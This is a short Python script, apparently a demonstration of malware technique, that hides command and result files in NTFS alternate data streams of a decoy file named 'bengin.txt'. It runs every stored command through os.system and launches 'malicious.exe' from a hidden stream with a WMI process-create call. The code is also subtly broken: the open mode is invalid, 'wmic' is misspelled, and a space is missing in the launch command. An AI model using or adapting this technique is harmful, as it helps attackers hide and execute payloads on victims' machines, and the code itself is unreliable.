import os

def builADSFilename(filename,streamname):
    return filename+":"+streamname

decoy="bengin.txt"
resultfile=builADSFilename(decoy,"results.txt")
commandfile= builADSFilename(decoy,"commands.txt")

#Run commands from file
with open(commandfile,"t") as c:
    for line in c:
        str(os.system(line+" >> "+resultfile))

#Run executable
exefile = "malicious.exe"
exepath = os.path.join(os.getcwd(),builADSFilename(decoy,exefile))
os.system("vmic process call create"+exepath)